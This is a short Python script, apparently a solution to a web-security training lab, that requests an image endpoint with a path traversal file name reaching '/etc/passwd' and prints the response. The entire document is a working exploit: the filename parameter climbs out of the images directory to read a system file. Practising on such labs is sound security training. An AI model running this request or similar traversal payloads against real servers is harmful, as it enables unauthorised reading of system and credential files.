import requests

s = requests.Session()

if __name__ == "__main__":
    site = 'aced1f721e111645c0ff1f1d00c4009e.web-security-academy.net'
    path = '/var/www/images/../../../etc/passwd'
    url = f'''https://{site}/image?filename={path}'''
    resp = s.get(url)
    print(resp.text)
